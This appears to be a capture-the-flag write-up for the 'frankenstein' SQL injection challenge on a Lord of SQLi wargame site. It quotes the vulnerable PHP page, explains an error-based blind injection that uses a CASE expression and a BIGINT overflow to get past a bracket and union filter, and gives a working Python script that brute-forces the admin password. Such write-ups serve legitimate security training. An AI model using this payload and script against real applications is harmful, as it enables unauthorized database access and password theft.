# frankenstein
```php
<?php
  include "./config.php";
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\(|\)|union/i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id,pw from prob_frankenstein where id='frankenstein' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(mysqli_error($db)) exit("error");

  $_GET[pw] = addslashes($_GET[pw]);
  $query = "select pw from prob_frankenstein where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("frankenstein");
  highlight_file(__FILE__);
?>
```
Here we have to brute force the admin's password. But we cannot use brackets or `union`. We are also not getting the outputs. We are only getting if there is an error or not. So we have to find a way to cause error when the characters are not correct. So we use `~0+1` which will return an error `BIGINT UNSIGNED value is out of range in '(~(0) + 1)'`. We are also using `CASE {} WHEN THEN {} ELSE` to cause the error only when the characters are not correct. SO we wrote a script to bruteforce it. 

```python
import requests
from string import digits, printable

session = requests.Session()
cookies = {"PHPSESSID": "t3ph90fkrspl4c71i1b8re936n"}
l=8
print("Length :", l)
url = "https://los.rubiya.kr/chall/frankenstein_b5bab23e64777e1756174ad33f14b5db.php?pw=' or case when id like 'a%25' and pw like '{}%25' or id like 'f%25' and pw like '%25' then 1 else ~0%2b1 end--+"
pw = ""
for j in range(l):
    for i in printable:
        r = requests.get(url.format(pw+i), cookies=cookies)
        if('error' not in r.text[-10:] and i not in "#+%&"):
            pw += i
            print("Password : {}".format(pw), end='\r')
            break
print("Password :", pw)
```
This will give the password as `0dc4efbb`